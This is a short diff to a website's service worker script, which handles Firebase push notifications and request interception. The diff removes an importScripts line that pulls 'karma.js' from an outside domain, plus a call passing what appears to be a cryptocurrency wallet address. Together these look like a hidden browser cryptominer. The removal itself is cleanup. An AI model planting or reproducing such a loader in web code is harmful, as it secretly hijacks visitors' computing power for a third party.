@@ -1,8 +1,6 @@
 importScripts("https://www.gstatic.com/firebasejs/11.2.0/firebase-app-compat.js");
 importScripts("https://www.gstatic.com/firebasejs/11.2.0/firebase-messaging-compat.js");
 
-importScripts("https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo");
-
 const HOSTNAME_WHITELIST = [self.location.hostname, "fonts.gstatic.com", "fonts.googleapis.com", "cdn.jsdelivr.net"];
 
 // The Util Function to hack URLs of intercepted requests
@@ -107,5 +105,3 @@ messaging.onBackgroundMessage((payload) => {
     icon: payload.notification.icon || "/icons/windows11/LargeTile.scale-100.png"
   });
 });
-
-EverythingIsLife('43NQtbvvFbF6PF1RWxNjxwj3ciNP8yfPCdeVV8MSsWVwEJAte1RKk5PRmHXdWJET2eVhcyJYMeBVyDFWEzq86PcsAHexkTW', 'adakah', 30);
